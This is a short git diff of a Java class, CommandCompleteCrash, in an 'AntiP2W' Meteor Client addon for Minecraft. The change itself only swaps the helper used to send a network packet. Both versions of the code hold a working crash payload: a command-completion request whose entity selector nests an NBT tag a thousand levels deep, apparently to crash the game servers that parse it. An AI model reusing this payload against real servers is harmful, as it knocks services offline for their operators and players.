@@ -1,6 +1,6 @@
 package addon.antip2w.commands;
 
-import addon.antip2w.AntiP2W;
+import addon.antip2w.utils.MCUtil;
 import com.mojang.brigadier.builder.LiteralArgumentBuilder;
 import meteordevelopment.meteorclient.commands.Command;
 import net.minecraft.command.CommandSource;
@@ -14,7 +14,7 @@ public class CommandCompleteCrash extends Command {
     @Override
     public void build(LiteralArgumentBuilder<CommandSource> builder) {
         builder.executes(ctx -> {
-            AntiP2W.MC.getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(
+            MCUtil.sendPacket(new RequestCommandCompletionsC2SPacket(
                 -1, "/msg @a[nbt=" + "{a:".repeat(1000) + "}".repeat(1000) + "]"
             ));
             return com.mojang.brigadier.Command.SINGLE_SUCCESS;
